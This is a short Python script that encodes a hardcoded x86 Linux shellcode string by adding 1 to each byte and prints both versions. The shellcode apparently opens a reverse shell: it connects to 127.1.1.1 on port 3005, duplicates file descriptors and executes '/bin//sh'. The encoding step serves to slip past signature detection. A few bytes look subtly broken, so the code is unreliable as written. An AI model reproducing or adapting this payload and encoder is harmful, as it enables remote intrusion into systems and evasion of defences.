import re

shellcode = "68 7f 01 01 01 66 68 0b bd 66 B8 67 01 B3 02 66 53 41 31 D2 cd 80 89 C3 66 B8 6a 01 89 E1 B2 10 cd 80 50 68 6e 2f 73 68 68 2f 2f 62 69 04 03 89 C1 B0 3f 49 cd 80 75 f9 89 C8 b2 0b 92 89 e3 cd 80 40 31 DB cd 80"

shellcode_encode = ""
for s in shellcode.split(" "):
    print("--> {}".format(s))
    shellcode_encode = shellcode_encode + " " + str(hex(int(s, 16)+1))

print("[-] shellcode ==> {}\n".format(shellcode))
print("[+] shellcode ==> {}\n".format(shellcode_encode))